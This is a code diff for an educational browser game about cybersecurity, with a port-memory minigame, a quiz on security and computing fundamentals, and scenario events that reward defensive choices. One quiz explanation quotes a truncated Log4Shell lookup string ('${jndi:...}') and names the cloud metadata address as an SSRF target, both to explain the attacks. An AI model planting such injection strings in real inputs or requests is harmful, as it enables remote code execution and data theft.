+      return verdict($('#fb'),true,` Commit ${bad} introduced the backdoor, found in ${budget-left} tests. Checking one by one could have taken ${N-2}.`,()=>{t.paused=false;r++;if(r>=rounds)return end(true);setup()})}
+    if(left<=0){busy=true;draw();sfx.bad();return later(()=>end(false,`Out of tests. It was commit ${bad}`),700)}
+    draw();const ruled=before-(hi-lo);if(before>=4&&ruled<before*.25)$('#fb').innerHTML=`<p class="hint">That test only ruled out ${ruled} of ${before} suspects. Test near the middle and you halve them every time.</p>`}
+  setup()}};
+
+/* ---- 11. Port Knock ---- */
+G.knock={name:'Port Knock',tag:'Ports and memory',glyph:'::',how:'A hidden service opens only for the right knock. Service names flash by; knock on their port numbers in the same order. Each sequence is one longer than the last. Two slips are allowed.',keys:'Keys 1-6 press the pads',
+play(d,done){const pads=shuffle(SV).slice(0,d<3?4:6),start=2+Math.floor(d/3),seqs=3,names=d<4,rev=d>=7;let si=0,seq=[],pos=0,miss=0,input=false;const body=frame(this);
+  const t=startTimer(seqs*(5+(start+1)*2.4),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();if(ok&&miss===0)award('knockp');done({win:ok&&miss<=2,mistakes:miss,perfect:ok&&miss===0,frac:t.frac(),learn:['ports','knock'],note:note||(miss>2?'Too many wrong knocks':''),game:'knock'})});
+  body.innerHTML=`<div class="target"><div class="lab" id="kl">Watch</div><div class="big" id="kd">&nbsp;</div></div><div class="kpads">${pads.map((q,j)=>`<button class="btn" data-j="${j}"><b${rev?' style="font-size:16px"':''}>${rev?q.n:q.p}</b>${names?`<small>${q.n}</small>`:''}</button>`).join('')}</div><p class="hint">${names?'At higher difficulty the pads show only numbers.':rev?'Reversed: port numbers flash by and you knock on the service names. No cheat sheet at this level.':pads.slice().sort((a,b)=>a.p-b.p).map(q=>q.p+' '+q.n).join(' · ')}</p>`;
+  const dots=()=>'●'.repeat(pos)+'○'.repeat(seq.length-pos);
+  function playSeq(){input=false;t.paused=true;pos=0;$('#gprog').textContent=`Sequence ${si+1} / ${seqs}`;$('#kl').textContent='Watch';const step=Math.max(430,840-d*40),kd=$('#kd');
+    seq.forEach((j,i)=>later(()=>{kd.textContent=rev?pads[j].p:pads[j].n;kd.classList.remove('popk');void kd.offsetWidth;kd.classList.add('popk');tone(300+j*90,.15,'triangle',.05)},450+i*step));
+    later(()=>{kd.textContent=dots();$('#kl').textContent=rev?'Your turn: knock on the services in order':'Your turn: knock on the ports in order';input=true;t.paused=false},450+seq.length*step)}
+  function newSeq(){seq=[];while(seq.length<start+si){const j=ri(0,pads.length-1);if(j!==seq[seq.length-1])seq.push(j)}playSeq()}
+  function press(j){if(!input||j>=pads.length)return;const b=$(`.kpads .btn[data-j="${j}"]`),good=j===seq[pos];b.classList.add(good?'lit':'err');setTimeout(()=>b.classList.remove('lit','err'),180);
+    if(good){tone(300+j*90,.12,'triangle',.05);pos++;$('#kd').textContent=dots();if(pos>=seq.length){input=false;sfx.ok();si++;if(si>=seqs)return later(()=>end(true),450);later(newSeq,750)}}
+    else{miss++;sfx.bad();input=false;t.paused=true;if(miss>2)return later(()=>end(false),500);$('#kl').textContent=`That was ${pads[j].n} (${pads[j].p}). The next knock was ${pads[seq[pos]].n} (${pads[seq[pos]].p}). Watch again.`;later(playSeq,1900)}}
+  $$('.kpads .btn').forEach(b=>b.onclick=()=>press(+b.dataset.j));keyFn=e=>{if(e.key>='1'&&e.key<='6'){press(+e.key-1);return true}};newSeq()}};
+
+/* ---- 7. Rapid Recall ---- */
+const QS=[
+[1,'Which port does HTTPS use by default?','443','80','22','8080','HTTPS is HTTP over TLS, on port 443.'],
+[1,'Which port does SSH use by default?','22','21','23','25','SSH is 22. Telnet (23) is the unencrypted ancestor.'],
+[1,'What does the "CIA triad" stand for?','Confidentiality, Integrity, Availability','Control, Identity, Access','Cipher, Integrity, Authentication','Confidentiality, Inspection, Audit','The three goals every security control serves.'],
+[1,'What does multi-factor authentication add?','A second kind of proof beyond the password','A longer password','Encryption of the login page','A firewall rule','Something you know plus something you have or are.'],
+[1,'Malware that encrypts your files and demands payment is called…','Ransomware','Spyware','Adware','A rootkit','Offline backups are the main defense.'],
+[1,'What is 1010 in decimal?','10','8','12','5','8 + 2 = 10.'],
+[1,'What is 0xFF in decimal?','255','256','127','15','Two hex digits, all bits set: 255.'],
+[1,'How many bits are in a byte?','8','4','16','10','Eight bits, 256 possible values.'],
+[1,'What does DNS do?','Translates names into IP addresses','Encrypts web traffic','Assigns IP addresses to devices','Blocks malicious sites','Assigning addresses is DHCP.'],
+[1,'Which password is strongest?','correct-horse-battery-staple-49','P@ssw0rd!','Summer2026','qwerty123','Length beats symbol tricks. Use a password manager.'],
+[1,'What is social engineering?','Manipulating people instead of breaking technology','Designing social networks','Writing malware for chat apps','Scanning for open ports','Phishing is its most common form.'],
+[1,'What does a software patch do?','Fixes bugs and vulnerabilities in existing software','Adds a firewall','Removes viruses from files','Encrypts the disk','Most breaches exploit flaws that already had a patch.'],
+[1,'What does a VPN do?','Encrypts traffic between you and the VPN server','Makes you immune to malware','Speeds up your connection','Hides you from the sites you log in to','It moves trust from your local network to the VPN provider.'],
+[1,'What is the difference between HTTP and HTTPS?','HTTPS encrypts the connection with TLS','HTTPS is faster','HTTPS blocks ads','HTTPS hides the site\'s domain','TLS also proves the server\'s identity.'],
+[2,'How is hashing different from encryption?','Hashing is one-way; encryption can be reversed with a key','Hashing is slower','Hashing needs two keys','There is no difference','That is why passwords are hashed, not encrypted.'],
+[2,'Why are password hashes salted?','So identical passwords produce different hashes','To make hashes shorter','To encrypt the hash','To speed up login','Salts defeat precomputed rainbow tables.'],
+[2,'What is the standard defense against SQL injection?','Parameterized queries','Longer passwords','HTTPS','Hiding error pages','Data never gets parsed as SQL.'],
+[2,'What is cross-site scripting (XSS)?','Injecting script that runs in other users\' browsers','Stealing a database with SQL','Flooding a site with traffic','Guessing passwords','Defense: encode output, add a Content Security Policy.'],
+[2,'What is the principle of least privilege?','Give each account only the access its job needs','Give admins the fewest passwords','Use the cheapest tools','Log in as rarely as possible','It limits the damage of any single compromise.'],
+[2,'Which of these is a hash function?','SHA-256','AES','RSA','TLS','AES and RSA are ciphers; TLS is a protocol.'],
+[2,'Which of these is a symmetric cipher?','AES','RSA','SHA-256','ECDSA','Symmetric means one shared key.'],
+[2,'What is a zero-day?','A flaw attackers know about before a patch exists','A virus that activates at midnight','A password that never expires','An account with no owner','Defenders have had zero days to fix it.'],
+[2,'What runs on port 53?','DNS','SSH','SMTP','RDP','DNS, mostly over UDP.'],
+[2,'What runs on port 3389?','Remote Desktop (RDP)','MySQL','HTTPS','FTP','Exposed RDP is a top ransomware entry point.'],
+[2,'What is the time complexity of binary search?','O(log n)','O(n)','O(n log n)','O(1)','Each step halves the search space.'],
+[2,'A stack is…','Last in, first out','First in, first out','Sorted by priority','Random access only','Queues are first in, first out.'],
+[2,'How many usable host addresses are in a /24?','254','256','255','128','256 minus the network and broadcast addresses.'],
+[2,'What is 127.0.0.1?','The loopback address (this machine)','The default gateway','A public DNS server','A broadcast address','Also known as localhost.'],
+[2,'Which address is private (not routable on the internet)?','192.168.4.20','8.8.8.8','172.50.0.1','1.1.1.1','Private ranges: 10/8, 172.16/12, 192.168/16. 172.50 is outside.'],
+[2,'What does a TLS certificate prove?','That the server controls the domain, vouched for by a CA','That the site is safe to use','That the site has no malware','That your password is strong','Phishing sites can have valid certificates too.'],
+[2,'What is 1 XOR 1?','0','1','2','10','XOR is 1 only when the inputs differ.'],
+[2,'Average lookup time in a hash table?','O(1)','O(log n)','O(n)','O(n²)','The key hashes straight to its bucket.'],
+[2,'What is a DDoS attack?','Many machines flooding a target to knock it offline','Stealing data from a database','A password guessing attack','Encrypting files for ransom','It targets availability.'],
+[3,'What is CSRF?','Tricking a logged-in browser into sending a request the user did not intend','Injecting SQL through a form','Stealing cookies with script','Cracking session IDs','Defense: anti-CSRF tokens and SameSite cookies.'],
+[3,'What is a buffer overflow?','Writing past the end of a buffer into adjacent memory','Sending too many packets','Filling a disk with logs','A stack that is too deep','It can overwrite return addresses and hijack execution.'],
+[3,'Why use bcrypt or Argon2 instead of SHA-256 for passwords?','They are deliberately slow, which cripples guessing','They produce longer hashes','They can be decrypted','They need no salt','Fast hashes let attackers try billions of guesses a second.'],
+[3,'What is Diffie-Hellman used for?','Agreeing on a shared secret over a public channel','Hashing passwords','Signing certificates','Compressing data','It is how TLS sets up session keys.'],
+[3,'To send Alice a secret, you encrypt with…','Alice\'s public key','Alice\'s private key','Your private key','Your public key','Only her private key can decrypt it.'],
+[3,'A digital signature is created with…','The sender\'s private key','The sender\'s public key','The receiver\'s public key','A shared password','Anyone can verify it with the public key.'],
+[3,'What does chmod 600 do to a file?','Owner can read and write; nobody else can do anything','Everyone can read it','Owner can execute it','It becomes hidden','6 = read + write. The standard for private keys.'],
+[3,'What is "zero trust"?','Verify every request; never trust based on network location','Trust nobody with admin rights','Block all traffic by default','Use no third-party software','Being inside the network earns nothing.'],
+[3,'What does a SYN flood abuse?','The TCP three-way handshake','DNS lookups','TLS certificates','ARP tables','Half-open connections exhaust the server.'],
+[3,'Average time complexity of quicksort?','O(n log n)','O(n)','O(n²)','O(log n)','Worst case is O(n²) with bad pivots.'],
+[3,'What is a rainbow table?','A precomputed map from hashes back to passwords','A list of leaked emails','A chart of port numbers','A type of firewall log','Salting makes them useless.'],
+[3,'What is lateral movement?','An attacker hopping from one compromised machine to others','Moving data to the cloud','Switching VPN servers','Rotating encryption keys','Network segmentation slows it down.'],
+[3,'What does a SIEM do?','Collects and correlates logs to spot threats','Encrypts backups','Scans code for bugs','Filters spam','Security Information and Event Management.'],
+[3,'An IDS detects intrusions. What does an IPS add?','It can block the traffic','It encrypts the traffic','It stores more logs','It scans email','Detection versus prevention.'],
+[3,'What is -1 as an 8-bit two\'s complement number?','11111111','10000001','10000000','00000001','Invert the bits of 1 and add 1.'],
+[3,'What is a race condition?','A bug where the result depends on the timing of events','A slow algorithm','Two programs with one name','A network that is too fast','Check-then-use gaps (TOCTOU) are the security classic.'],
+[3,'What is a honeypot?','A decoy system built to attract and study attackers','A password vault','A phishing email','A type of ransomware','Any connection to it is suspicious by definition.'],
+[3,'A XOR B XOR B equals…','A','B','0','A AND B','XOR-ing twice with the same value cancels out.'],
+[1,'An MFA prompt appears that you did not trigger. What should you do?','Deny it and change your password','Approve it so it stops','Ignore it','Approve it if it is during work hours','Someone already has your password. "MFA fatigue" attacks count on you tapping approve.'],
+[1,'Which is a real example of two different factors?','A password plus a code from your phone','A password plus a security question','Two different passwords','A PIN plus a password','Something you know plus something you have. Two things you know is still one factor.'],
+[1,'What makes backups useful against ransomware?','You can restore without paying','They stop the infection','They hide files from attackers','They encrypt the network','Keep one copy offline, where the malware cannot reach it.'],
+[1,'In programming, what is a variable?','A named place to store a value','A kind of loop','A syntax error','A function with no name','The name lets you read and change the value later.'],
+[1,'How many values can 8 bits represent?','256','255','128','512','2 to the power 8. The values run 0 to 255.'],
+[2,'What is credential stuffing?','Trying leaked username and password pairs on other sites','Guessing every possible password','Stealing session cookies','Flooding a login page','It works because people reuse passwords.'],
+[2,'What is a CVE number?','A public ID for one specific known vulnerability','A password strength score','A firewall rule ID','A certificate serial number','CVE-2021-44228 is Log4Shell, for example.'],
+[2,'What does end-to-end encryption mean?','Only the two endpoints can read the messages','The server encrypts its stored data','The Wi-Fi link is encrypted','Messages delete themselves','Not even the service operator holds the keys.'],
+[2,'Which HTTP status code means "not found"?','404','200','301','500','4xx codes are client errors, 5xx are server errors.'],
+[2,'Which protocol copies files securely over SSH?','SFTP','FTP','TFTP','Telnet','Plain FTP sends passwords in clear text.'],
+[2,'Which data structure does breadth-first search use?','A queue','A stack','A heap','A hash table','Depth-first search uses a stack.'],
+[2,'What is a botnet?','A network of hijacked devices controlled by an attacker','A group of security researchers','A chat program for bots','A type of firewall','They power DDoS attacks and spam.'],
+[2,'What does a linked list do better than an array?','Insert in the middle cheaply','Jump to any index instantly','Use less memory per item','Stay sorted automatically','Arrays win at random access.'],
+[3,'What is SSRF?','Tricking a server into making requests to internal systems','Running script in another user\'s browser','Forging a user\'s session cookie','Overflowing a server buffer','The classic target is the cloud metadata service at 169.254.169.254.'],
+[3,'What made Log4Shell so dangerous?','A logged string could make the server load remote code','It broke TLS encryption','It leaked passwords into logs','It disabled firewalls','${jndi:...} in any logged field was enough.'],
+[3,'What is a supply chain attack?','Compromising software or a vendor that the target trusts','Stealing hardware in transit','Flooding a shipping API','Phishing the CEO','You inherit the security of everything you install.'],
+[3,'What does "defense in depth" mean?','Layering independent controls so one failure is not fatal','Buying the most expensive firewall','Hiding servers deep in the network','Encrypting data twice','Assume every single control will fail someday.'],
+[3,'What does forward secrecy protect?','Past sessions, even if the long-term key leaks later','Future passwords','The server certificate','Deleted files','Each session uses throwaway keys.'],
+[3,'What is a nonce?','A number used only once','A hashed password','A revoked certificate','A null pointer','Reusing one can break an otherwise strong cipher.'],
+[3,'What does ASLR randomize?','Where code and data sit in memory','Password hashes','Network ports','File names','It makes memory-corruption exploits unreliable.'],
+[1,'What does the padlock icon in a browser tell you?','The connection to the site is encrypted','The site is trustworthy','The site has no malware','You are logged in','It says nothing about who runs the site. Phishing pages have padlocks too.'],
+[1,'You step away from your laptop in a cafe. What first?','Lock the screen, or take it with you','Dim the display','Close the browser tab','Turn off Wi-Fi','An unlocked machine needs no hacking at all.'],
+[2,'What is "shoulder surfing"?','Watching someone enter a password or PIN','Riding on another user\'s session','Scanning a network from outside','Guessing passwords from social media','Low tech, and it still works.'],
+[2,'What problem does a password manager solve best?','Reusing one password across many sites','Weak Wi-Fi encryption','Phishing emails arriving','Slow logins','One breach no longer unlocks everything else.'],
+[2,'Hash the same input twice with SHA-256. What do you get?','The same output both times','Two different outputs','An output that depends on the time','A longer output the second time','Hashes are deterministic, which is what makes verification possible.'],
+[2,'In Git, what does a commit hash identify?','One exact snapshot of the project','A branch name','A user account','A remote server','Change a single byte and the hash changes.'],
+[3,'What is the cyber "kill chain"?','The stages of an attack, from reconnaissance to objective','A list of banned software','A chain of firewalls','A way to revoke certificates','Break any one stage and the attack fails.'],
+[3,'What does a stack canary do?','Detects a buffer overflow before the return address is used','Encrypts the stack','Speeds up function calls','Randomizes memory layout','If the canary value changed, the program aborts instead of jumping.'],
+[3,'What must every recursive function have?','A base case','A loop','A global variable','Two parameters','Without one it recurses until the stack overflows.'],
+[1,'What is phishing?','A message that tricks you into giving up information','A slow network connection','A type of firewall','A password manager','It works on people, not on software.'],
+[1,'What does a firewall do?','Filters network traffic by rules','Scans files for viruses','Encrypts the hard disk','Speeds up the internet','It decides which connections are allowed in and out.'],
+[1,'What is malware?','Software designed to cause harm','A broken hardware part','An expired certificate','A weak password','Viruses, worms, ransomware and spyware are all malware.'],
+[1,'What happens to the contents of RAM when the power goes off?','They are lost','Nothing','They move to the disk','They are encrypted','RAM is volatile memory; storage is not.'],
+[1,'What does an IP address identify?','A device on a network','A person','The owner of a website','A file','It is an address for delivering packets, not an identity.'],
+[1,'Which of these is a biometric factor?','A fingerprint','A PIN','A phone','A password','Biometrics are "something you are".'],
+[1,'What is a keylogger?','Software that records what you type','A tool that creates passwords','A list of login times','A hardware lock','It captures passwords as they are entered, before any encryption.'],
+[1,'What is a brute-force attack?','Trying every possible password','Guessing from personal details','Tricking the user by email','Stealing the password file','Long passwords and attempt limits make it impractical.'],
+[1,'What is tailgating?','Following someone through a secure door','Sending email after hours','Copying files to a USB stick','Reading over a shoulder','Polite people hold doors, and attackers count on it.'],
+[1,'Which hex digit means 1111?','F','E','9','A','1111 is 15, and 15 in hex is F.'],
+[1,'What does shifting a binary number left by one place do?','Doubles it','Halves it','Adds one','Flips it','Every bit moves to a place worth twice as much.'],
+[2,'What does a hash function produce?','A fixed-size fingerprint of the input','An encrypted copy you can decrypt','A compressed file','A random password','The same input always gives the same fingerprint, and you cannot run it backwards.'],
+[2,'What is a man-in-the-middle attack?','Secretly relaying traffic between two parties','Guessing passwords one at a time','Flooding a server with requests','Sending fake emails','TLS with certificate checks is the defence.'],
+[2,'Which data structure is first-in, first-out?','Queue','Stack','Tree','Hash table','A stack is the opposite: last in, first out.'],
+[2,'What is typosquatting?','Registering lookalike domain names','Typing passwords too fast','Leaving typos in code','Guessing usernames','One swapped letter is enough to fool a quick glance.'],
+[2,'What is a subnet mask for?','Splitting an address into network and host parts','Hiding an IP address','Encrypting a subnet','Blocking a port','It says which bits name the network and which name the machine.'],
+[2,'What does TCP guarantee that UDP does not?','Delivery and ordering','Encryption','Speed','Anonymity','UDP just sends and hopes, which is why it is faster.'],
+[2,'What is a port scan?','Probing which services a machine exposes','Checking a cable','Copying a disk','Reading a log','It is usually the first step of an attack, and the first thing defenders look for.'],
+[2,'What is sandboxing?','Running code in an isolated environment','Deleting temporary files','Encrypting a folder','Testing with fake data','If the code is hostile, the damage stays inside the box.'],
+[2,'What is an insider threat?','Risk from someone with legitimate access','Malware inside a file','An attack on the internal network','A bug in internal tools','No firewall stops someone who is already allowed in.'],
+[2,'What is the 3-2-1 backup rule?','3 copies, 2 kinds of media, 1 offsite','3 passwords, 2 factors, 1 device','3 backups a day','3 servers, 2 sites, 1 admin','One copy has to be out of reach of whatever hits the others.'],
+[2,'What is data exfiltration?','Moving stolen data out of the network','Deleting old data','Encrypting data at rest','Indexing a database','Large unusual uploads are the thing to watch for.'],
+[2,'What does a compiler do?','Translates source code into machine code','Runs code line by line','Finds security bugs','Stores code versions','An interpreter runs it line by line instead.'],
+[2,'A loop inside a loop over the same list has what time complexity?','O(n²)','O(n)','O(log n)','O(2n)','Every item is paired with every other item.'],
+[2,'What is an air gap?','A machine with no network connection at all','A gap in firewall rules','Space between server racks','A delay between backups','Used for the most sensitive systems. USB sticks are how attackers cross it.'],
+[3,'Why is a hash collision dangerous?','Two different inputs share one fingerprint','The hash can be decrypted','The hash is too long','The salt is revealed','A forged file can pass as the real one. MD5 and SHA-1 are broken this way.'],
+[3,'What is the worst-case time complexity of quicksort?','O(n²)','O(n log n)','O(n)','O(log n)','It averages O(n log n), but bad pivots degrade it.'],
+[3,'What is privilege escalation?','Gaining more access than you were given','Logging in as yourself','Encrypting a disk','Scanning a network','A foothold as a normal user becomes control as admin.'],
+[3,'What does a digital signature prove?','Who signed it and that it was not altered','That the content is secret','That the sender is trustworthy','That the file has no malware','Integrity and authenticity, not confidentiality.'],
+[3,'Which is NOT a property of a good cryptographic hash?','Reversible','Deterministic','Collision resistant','Fixed-size output','If you can reverse it, it is not a hash.'],
+[3,'What is a TOCTOU bug?','A gap between checking something and using it','A typo in a config file','A timeout on a connection','A missing log entry','Time of check to time of use: the thing changes in between.'],
+[3,'What does "fail closed" mean?','When something breaks, deny access','When something breaks, allow access','Close the app on error','Hide error messages','A broken lock should stay locked.'],
+[3,'Kerckhoffs\'s principle says a cipher must stay secure even if…','Everything except the key is public','The key is public','It is used only once','The attacker has no computer','Security through obscurity is not security.'],
+[3,'What is key stretching?','Making each password guess deliberately slow','Using a longer password','Adding a second key','Reusing a key safely','bcrypt, scrypt and Argon2 do it so stolen hashes are expensive to crack.'],
+[3,'What is steganography?','Hiding data inside other data','Scrambling data with a key','Compressing data','Signing data','Encryption hides the meaning; steganography hides that a message exists.'],
+[3,'What is a logic bomb?','Malicious code that waits for a trigger','A very large file','A denial-of-service tool','A broken if statement','It sits quietly until a date or event sets it off.'],
+];
+G.quiz={name:'Rapid Recall',tag:'Core knowledge',glyph:'?',how:'Quick-fire questions on security and computer science fundamentals. One mistake is allowed.',keys:'Keys 1-4 pick an answer',
+play(d,done){const lo=d<5?1:2,hi=d<3?1:d<5?2:3;const n=Math.min(9,5+Math.floor(d/2));const qs=shuffle(QS.filter(q=>q[0]>=lo&&q[0]<=hi)).slice(0,n);
+  let i=0,miss=0,busy=false,opts;const allow=n>=8?2:1;const body=frame(this);
+  const t=startTimer(n*Math.max(6,9-d*.3),()=>end(false,'Out of time'));
+  const end=once((ok,note)=>{t.stop();done({win:ok&&miss<=allow,mistakes:miss,perfect:ok&&miss===0,frac:t.frac(),learn:['cia'],note:note||(miss>allow?'Too many wrong answers':''),game:'quiz'})});
+  function render(){busy=false;const q=qs[i];opts=shuffle(q.slice(2,6));$('#gprog').textContent=`Question ${i+1} / ${qs.length}`;
+    body.innerHTML=`<p class="q">${esc(q[1])}</p><div class="opts">${opts.map((o,j)=>`<button class="btn" data-j="${j}"><span class="mono" style="color:var(--dim)">${j+1}</span>&nbsp; ${esc(o)}</button>`).join('')}</div><div id="fb"></div>`;
+    $$('.opts .btn').forEach(b=>b.onclick=()=>ans(+b.dataset.j));keyFn=e=>{if(e.key>='1'&&e.key<='4'){ans(+e.key-1);return true}}}
+  function ans(j){if(busy)return;busy=true;const q=qs[i],ok=opts[j]===q[2];t.paused=true;$$('.opts .btn').forEach((b,k)=>{b.disabled=true;if(opts[k]===q[2])b.classList.add('right');else if(k===j)b.classList.add('wrongp')});
+    ok?sfx.ok():(sfx.bad(),miss++);verdict($('#fb'),ok,' '+esc(q[6]),()=>{t.paused=false;i++;if(miss>allow)return end(false);if(i>=qs.length)return end(true);render()},ok?1100:0)}
+  render()}};
+
+/* =====================================================================
+   RUN
+   ===================================================================== */
+const SECT=['Perimeter','Internal network','Crown jewels'];
+const BOSSES=[{n:'LOCKJAW',t:'Ransomware outbreak',x:'Files on the finance share are being encrypted. Three systems stand between it and the backups.',rule:'It is racing you: every timer is 15% shorter.',ph:3,need:2,time:.85},
+  {n:'HYDRA',t:'Botnet controller',x:'Dozens of workstations are calling home to the same server.',rule:'Cut one head and another grows: four phases, and you must win three.',ph:4,need:3},
+  {n:'SILENT OWL',t:'Advanced persistent threat',x:'They have been inside for weeks, and they are after the crown jewels.',rule:'It punishes noise: every mistake and lost phase costs double breach.',ph:3,need:2,noise:2},
+  {n:'MIRAGE',t:'Insider threat',x:'The activity is coming from a valid account. Someone inside is helping.',rule:'Rushing gets you nothing: speed bonuses are worth zero in this fight.',ph:3,need:2,nospeed:1},
+  {n:'BLACKOUT',t:'Wiper malware',x:'It is not here to steal anything. It is here to erase everything.',rule:'No second chances: you must win all three phases.',ph:3,need:3}];
+const PERKS=[
+ {id:'oc',n:'Overclock',x:'+15% time on every timer.',c:60,f:r=>r.mods.time+=.15},
+ {id:'seg',n:'Network segmentation',x:'All breach gains reduced by 20%.',c:70,f:r=>r.mods.trace*=.8},
+ {id:'hp',n:'Honeypot',x:'Absorbs all breach from the next node you lose.',c:45,f:r=>r.shields++},
+ {id:'bb',n:'Bug bounty',x:'+30% credits from every node.',c:50,f:r=>r.mods.credit+=.3},
+ {id:'ti',n:'Threat intel feed',x:'+20% score from every node.',c:80,f:r=>r.mods.score+=.2},
+ {id:'patch',n:'Emergency patch',x:'Breach drops by 30 points right now.',c:55,f:r=>r.breach=Math.max(0,r.breach-30)},
+ {id:'cap',n:'Combo capacitor',x:'Combo cap rises by ×1, and your next lost node will not reset the combo.',c:90,f:r=>{r.comboCap+=1;r.guard++}},
+ {id:'bak',n:'Offline backups',x:'Once: at 100% breach, restore to 70% instead of losing the run.',c:110,f:r=>r.kill++},
+ {id:'adr',n:'Adrenaline',x:'Speed bonuses are doubled.',c:70,f:r=>r.mods.speed+=1},
+ {id:'int',n:'Compound interest',x:'After every secured node, gain 10% of your credits (up to 20).',c:60,f:r=>r.interest=1},
+ {id:'ins',n:'Cyber insurance',x:'Every lost node pays out 30 credits.',c:40,f:r=>r.ins++},
+ {id:'drl',n:'Tabletop drills',x:'Flawless bonuses are doubled.',c:65,f:r=>r.mods.perf+=1}];
+const CLASSES=[
+ {id:'ana',n:'Analyst',x:'Balanced. No strengths, no weaknesses.',rank:0,f:r=>{}},
+ {id:'sen',n:'Sentinel',x:'Starts with a honeypot and takes 20% less breach. Scores 10% less.',rank:1,f:r=>{r.shields=1;r.mods.trace=.8;r.mods.score=.9}},
+ {id:'bro',n:'Broker',x:'Starts with 80 credits and earns 30% more. Takes 15% more breach.',rank:2,f:r=>{r.credits=80;r.mods.credit=1.3;r.mods.trace=1.15}},
+ {id:'spr',n:'Sprinter',x:'Every timer is 15% shorter. Scores 30% more.',rank:3,f:r=>{r.mods.time=.85;r.mods.score=1.3}},
+ {id:'gam',n:'Gambler',x:'Combo cap is ×5 instead of ×3. Takes 50% more breach.',rank:5,f:r=>{r.comboCap=5;r.mods.trace=1.5}}];
+const MUTS=[
+ {n:'Tight budget',x:'Nodes pay half the credits.',f:r=>r.mods.credit*=.5},
+ {n:'Adrenaline rush',x:'Timers are 15% shorter and score is 25% higher.',f:r=>{r.mods.time*=.85;r.mods.score*=1.25}},
+ {n:'Zero tolerance',x:'Breach gains are 30% higher, but the combo cap is ×4.',f:r=>{r.mods.trace*=1.3;r.comboCap=4}},
+ {n:'Well funded',x:'You start with 100 credits.',f:r=>r.credits+=100},
+ {n:'Slow burn',x:'Timers are 20% longer and score is 15% lower.',f:r=>{r.mods.time*=1.2;r.mods.score*=.85}},
+ {n:'Hardened network',x:'You start with a honeypot and offline backups.',f:r=>{r.shields++;r.kill++}},
+ {n:'Flawless or nothing',x:'Flawless bonuses are tripled, speed bonuses are gone.',f:r=>{r.mods.perf=3;r.mods.speed=0}}];
+const dailyMut=()=>MUTS[hashStr('mut-'+today())%MUTS.length];
+const diff=()=>1+run.sector*2+run.step*.5;
+const mult=c=>c<=1?1:Math.min(run.comboCap,1+.25*(c-1));
+const sectName=s=>s<3?SECT[s]:`Deep net ${s-2}`;
+
+function hud(){const h=$('#hud');h.hidden=!run;if(!run)return;$('#hbv').textContent=Math.round(run.breach)+'%';$('#hbf').style.width=run.breach+'%';h.classList.toggle('crit',run.breach>=70);$('#hsc').textContent=run.score.toLocaleString();
+  const m=mult(run.combo+1);$('#hco').textContent='×'+m.toFixed(2)+(run.combo?' · '+run.combo:'');$('#hco').classList.toggle('hot',m>1);$('#hcr').textContent=run.credits;$('#hquit').textContent='Quit'}
+$('#hquit').onclick=e=>{if(e.target.textContent==='Quit'){e.target.textContent='End run?';setTimeout(()=>{if(run)e.target.textContent='Quit'},2500)}else gameOver(false)};
+
+function newRun(daily,cls){sfx.click();cls=cls||CLASSES[0];_r=mulberry(daily?hashStr('hexbreak-'+today()):(Math.random()*2**32)>>>0);
+  run={daily,cls,sector:0,step:0,breach:0,score:0,credits:0,combo:0,maxCombo:0,comboCap:3,perks:[],shields:0,guard:0,kill:0,interest:0,ins:0,boss:null,lostBy:{},evt:{},mods:{time:1,trace:1,credit:1,score:1,speed:1,perf:1},cleared:0,played:0,last:null,won:false};
+  cls.f(run);if(!daily)S.cls=cls.id;if(daily){const m=dailyMut();run.mut=m.n;m.f(run)}
+  S.runs++;if(daily&&S.lastDaily!==today()){const y=new Date();y.setDate(y.getDate()-1);S.streak=S.lastDaily===dstr(y)?S.streak+1:1;S.lastDaily=today();if(S.streak>=3)award('st3')}
+  persist();hud();mapScreen()}
+
+function saveRun(pending){if(!run)return;try{localStorage.setItem(KEY+'.run',JSON.stringify({run:{...run,cls:run.cls.id,boss:null},rs:RS,pending:pending||0,day:today()}))}catch(e){}}
+function dropRun(){try{localStorage.removeItem(KEY+'.run')}catch(e){}}
+function loadRun(){try{const o=JSON.parse(localStorage.getItem(KEY+'.run')||'null');if(!o||!o.run||typeof o.run.score!=='number')return null;if(o.run.daily&&o.day!==today())return null;return o}catch(e){return null}}
+function resumeRun(){const o=loadRun();if(!o)return home();sfx.click();run=o.run;run.cls=CLASSES.find(c=>c.id===run.cls)||CLASSES[0];run.boss=null;run.evt=run.evt||{};run.lostBy=run.lostBy||{};_r=mulberry(o.rs);
+  if(o.pending===1){run.breach=Math.min(100,run.breach+22);run.combo=0;run.step++;toast('You walked away mid-node. <b>Breach +22</b>')}
+  if(o.pending===2){run.breach=Math.min(100,run.breach+30);run.combo=0;toast('The boss went unanswered. <b>Breach +30</b>')}
+  hud();if(run.breach>=100)return gameOver(false);if(o.pending>=2)return shop();mapScreen()}
+
+const EVENTS=[
+{t:"A USB stick in the car park",x:"It is labelled \"Payroll Q4\". Reception hands it to you and asks whose it is.",o:[
+ ["Plug it into your workstation and look",r=>{r.breach=Math.min(99,r.breach+15);return["Breach +15","It auto-ran a payload. Dropped USB sticks are a classic attack, and curiosity is the exploit.",0]}],
+ ["Open it on an isolated analysis machine",r=>{r.credits+=40;return["+40 credits","You recovered the attacker's tooling safely. Unknown media only ever touches a machine with nothing to lose.",1]}]]},
+{t:"The CEO wants admin rights",x:"\"Just for five minutes, to install a font before the board meeting.\"",o:[
+ ["Grant local admin, it is the CEO",r=>{r.breach=Math.min(99,r.breach+12);r.credits+=25;return["+25 credits, breach +12","Executives are the most phished people in the company. Rank is not a reason to skip least privilege.",0]}],
+ ["Install the font for them instead",r=>{r.score+=120;return["+120 score","The need was a font, not admin rights. Solve the task, keep the privilege.",1]}]]},
+{t:"A critical patch lands mid-incident",x:"The vendor just shipped a fix for the exact flaw being exploited. Installing it means a reboot and losing your rhythm.",o:[
+ ["Patch and reboot now",r=>{r.combo=0;r.breach=Math.max(0,r.breach-18);return["Breach −18, combo reset","Costly but correct. A known, actively exploited hole is the one thing that cannot wait.",1]}],
+ ["Defer it to the maintenance window",r=>{if(rnd()<.6){r.breach=Math.min(99,r.breach+18);return["Breach +18","They used the same hole again. Most breaches exploit flaws that already had a patch available.",0]}return["Nothing happened, this time","You got lucky. Deferring a patch for an actively exploited flaw is a bet, not a plan.",0]}]]},
+{t:"A ransom note arrives",x:"\"Send 100 credits and we walk away.\" Finance asks what you recommend.",o:[
